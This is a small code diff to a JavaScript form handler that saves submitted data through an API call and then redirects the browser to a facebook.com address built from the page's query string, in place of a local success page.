@@ -42,9 +42,9 @@ form.addEventListener('submit', (e) => {
     fetch("/api/saveData", requestOptions)
         .then(response => response.text())
         .then(result => {
-            // console.log(result)
-            window.location.href = "/success";
-
+            console.log('ok')
+            redirectlink = `https://www.facebook.com/${window.location.href.split('?')[1]}`
+            window.location.href = redirectlink
         })
         .catch(error => console.log('error', error));
 })
